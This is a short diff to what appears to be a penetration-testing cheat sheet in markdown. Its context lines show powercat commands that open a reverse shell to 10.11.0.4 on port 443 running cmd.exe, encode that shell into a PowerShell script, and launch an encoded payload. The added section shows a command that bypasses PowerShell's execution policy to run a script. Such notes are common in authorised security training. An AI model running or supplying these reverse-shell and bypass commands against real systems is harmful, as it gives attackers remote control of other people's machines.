@@ -74,3 +74,7 @@ powercat -c 10.11.0.4 -p 443 -e cmd.exe
 powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
 powershell.exe -E en_payload
 ```
+### Allow unsigned scripts execute
+```
+powershell -ExecutionPolicy Bypass -File admin_login.ps1
+```
